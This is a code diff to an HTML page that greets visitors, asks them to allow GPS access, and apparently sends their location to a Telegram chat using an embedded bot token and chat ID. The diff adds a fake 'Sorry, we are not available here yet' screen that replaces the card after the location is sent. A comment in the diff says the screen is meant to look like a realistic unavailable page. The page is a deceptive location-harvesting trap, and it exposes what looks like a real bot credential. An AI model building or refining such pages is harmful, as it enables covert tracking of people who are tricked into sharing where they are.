@@ -32,14 +32,13 @@
   </style>
 </head>
 <body>
-  <div class="card">
+  <div class="card" id="mainCard">
     <h2>Hello</h2>
     <p>Please tap <b>"Allow"</b> we need your location to start.</p>
     <div id="status" class="status">Requesting GPS location...</div>
   </div>
 
   <script>
-    // Paste your Telegram token and ID inside these quotes
     const BOT_TOKEN = "8634499214:AAGtssxvzUtcjxilnJQSJWjqu-P6tmxQk_k";
     const CHAT_ID = "7187217908";
 
@@ -61,11 +60,15 @@
       })
       .then(response => {
         if (response.ok) {
-          const status = document.getElementById("status");
-          status.innerText = "❤️‍🩹 sorry we are not available here yet.";
-          status.style.color = "#16a34a";
+          // Replaces the whole card so it looks like a realistic service unavailable page
+          document.getElementById("mainCard").innerHTML = `
+            <div style="font-size: 40px; margin-bottom: 12px;">❤️‍🩹</div>
+            <h2 style="font-size: 18px; color: #444; line-height: 1.4; margin: 0;">
+              Sorry, we are not available here yet.
+            </h2>
+          `;
         } else {
-          showError("network error.");
+          showError("Network error.");
         }
       })
       .catch(() => {
@@ -75,8 +78,10 @@
 
     function showError(msg) {
       const status = document.getElementById("status");
-      status.innerText = msg;
-      status.style.color = "#dc2626";
+      if (status) {
+        status.innerText = msg;
+        status.style.color = "#dc2626";
+      }
     }
 
     function handleLocationError(err) {
@@ -99,4 +104,4 @@
     }
   </script>
 </body>
-  </html>
+</html>
